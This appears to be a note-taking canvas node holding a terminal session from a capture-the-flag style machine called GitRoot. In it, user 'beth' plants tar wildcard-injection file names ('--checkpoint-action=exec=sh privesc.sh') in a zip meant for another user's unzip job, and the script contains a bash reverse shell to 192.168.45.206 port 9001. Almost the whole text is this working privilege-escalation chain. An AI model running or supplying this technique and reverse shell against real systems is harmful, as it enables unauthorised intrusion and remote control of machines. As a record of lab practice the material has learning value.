		{"id":"420b3d3e945ce3cc","type":"text","text":"```bash\nbeth@GitRoot:~$ touch privesc.sh\nbeth@GitRoot:~$ chmod 777 privesc.sh \nbeth@GitRoot:~$ ls\n'--checkpoint=1'  '--checkpoint-action=exec=sh privesc.sh'   privesc.sh   pspy64   public\nbeth@GitRoot:~$ vim privesc.sh \nbeth@GitRoot:~$ ls\n'--checkpoint=1'  '--checkpoint-action=exec=sh privesc.sh'   privesc.sh   pspy64   public\nbeth@GitRoot:~$ which zip\nbeth@GitRoot:~$ python -m zipfile -c my.zip \n.bash_history                           --checkpoint=1                          privesc.sh                              public/                                 \n.bash_logout                            --checkpoint-action=exec=sh privesc.sh  .profile                                .viminfo                                \n.bashrc                                 .gnupg/                                 pspy64                                  \nbeth@GitRoot:~$ python -m zipfile -c my.zip \\-\\-checkpoint\\=1 \\-\\-checkpoint\\-action\\=exec\\=sh\\ privesc\\.sh\nbeth@GitRoot:~$ ls\n'--checkpoint=1'  '--checkpoint-action=exec=sh privesc.sh'   my.zip   privesc.sh   pspy64   public\nbeth@GitRoot:~$ cat public/addToMyRepo.txt \nHello Beth\n\nIf you want to commit to my repository you can add a zip file to ~jen/public/repos/ and ill unzip it and add it to my repository\n\nThanks!\n\nbeth@GitRoot:~$ cat privesc.sh \nbash -i >& /dev/tcp/192.168.45.206/9001 0>&1\n\n```","x":13880,"y":9131,"width":765,"height":480},
